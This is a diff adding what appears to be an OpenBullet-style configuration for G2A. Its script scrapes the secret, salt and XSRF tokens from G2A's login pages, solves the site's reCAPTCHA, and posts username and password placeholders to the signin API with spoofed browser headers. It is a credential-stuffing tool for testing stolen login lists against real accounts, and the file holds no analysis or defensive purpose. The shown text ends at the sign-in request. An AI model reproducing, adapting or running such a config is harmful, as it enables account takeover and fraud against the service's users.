@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "G2A",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-13T17:46:17.1071561+00:00",
+  "AdditionalInfo": "",
+  "Author": "DADEX55",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_LOGIN_REQUEST REQUEST GET "https://id.g2a.com/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://id.g2a.com" 
+  HEADER "Referer: https://id.g2a.com/login" 
+#PARSE_SECRET PARSE "<SOURCE>" CSS "[name=secret]" "value" 0 -> VAR "SECRET" "" "" 
+#PARSE_SALT PARSE "<SOURCE>" CSS "[name=salt]" "value" 0 -> VAR "SALT" "" "" 
+REQUEST GET "https://id.g2a.com/create" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "referer: https://id.g2a.com/login" 
+#PARSE_XSRF PARSE "<COOKIES(XSRF-TOKEN)>" LR "" "" Recursive=FALSE -> VAR "XSRF" "" "" 
+RECAPTCHA "https://id.g2a.com/login" "6LdcvgoTAAAAAMEcFMv1skcN1oT512t4OqtT525w" -> VAR "RECAPTCHA" 
+#REQUEST_[POST] REQUEST POST "https://id.g2a.com/front/api/v2/signin" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"mobile_token\":\"\",\"security\":\"<RECAPTCHA>\",\"remember_me\":false,\"protection\":\"\",\"salt\":\"<SALT>\",\"secret\":\"<SECRET>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://id.g2a.com/" 
+  HEADER "Referer: https://id.g2a.com/login" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "x-xsrf-token: <XSRF>" 
